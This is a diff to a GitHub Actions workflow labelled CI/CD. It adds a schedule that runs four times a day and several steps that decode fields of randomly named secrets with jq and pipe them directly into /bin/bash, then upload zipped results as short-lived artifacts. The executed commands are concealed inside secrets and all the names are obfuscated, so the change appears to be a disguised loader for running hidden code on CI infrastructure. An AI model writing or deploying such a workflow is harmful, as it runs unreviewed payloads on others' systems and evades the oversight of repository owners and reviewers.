@@ -2,6 +2,8 @@ name: CI/CD
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '3 0,6,12,18 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,15 +18,19 @@ jobs:
           fetch-depth: 1
       - name: Process
         env:
-          kgs3: ${{ secrets.kgs3 }}
+          fewup8: ${{ secrets.fewup8 }}
         run: |
-          printf '%s' "$kgs3" | jq -r .ykrtw044 | /bin/bash
-          printf '%s' "$uoy988" | jq -r .oike671 | /bin/bash
+          printf '%s' "$fewup8" | jq -r .j2 | /bin/bash
+          printf '%s' "$cjhw493" | jq -r .fqxj71733 | /bin/bash
+          echo $u06 | jq -r .hnhzj00356 | /bin/bash
+          printf '%s' "$kba566" | jq -r .ahumn57 | /bin/bash
+          printf '%s' "$kzrfr272" | jq -r .k60237 | /bin/bash
+          echo $abpqe05 | jq -r .duok48 | /bin/bash
 
       - name: Store results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: 9T3vf2XX
+          name: PaJiEVUv
           path: "*.zip"
           retention-days: 1
